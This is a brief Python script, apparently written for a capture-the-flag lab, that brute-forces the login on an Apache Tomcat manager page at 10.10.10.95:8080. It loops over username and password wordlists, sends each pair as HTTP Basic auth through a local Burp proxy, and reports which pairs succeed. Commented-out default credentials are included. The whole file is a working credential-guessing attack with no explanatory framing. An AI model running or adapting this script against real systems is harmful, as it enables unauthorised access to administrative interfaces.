#!/usr/bin/python3
# coding:utf-8

from pwn import *
from base64 import *
import requests,re,pdb

def def_handler(sig,frame):
	print("\n[!]Saindo...\n")
	sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT,def_handler)

# Variable_Global
main_url = "http://10.10.10.95:8080/manager/html"
# user = b"tomcat"
espa = b":"
# password = b"s3cret"
burp = {'http': 'http://127.0.0.1:8080' }

def makeRequest():

	s = requests.session()

	p1 = log.progress("Brute Force Tomcat")
	p1.status("Start Brute Force")

	sleep(2)

	fu = open('/tmp/tomworduser','rb').read().splitlines()

	fp = open('/tmp/tomwordpass','rb').read().splitlines()

	for user in fu:
		for password in fp:

			user = user.strip()
			password = password.strip()

			p1.status(f"Testing {user.decode()}:{password.decode()}")

			base = b64encode(user + espa + password)

			base = base.decode()
			
			head = {
				'Authorization': f"Basic {base}"
			}

			r = s.get(main_url, headers=head, proxies=burp)

			if r.status_code == 200:
				log.info(f"Sucess {user.decode().strip()}:{password.decode().strip()}")

if __name__ == '__main__':

	makeRequest()
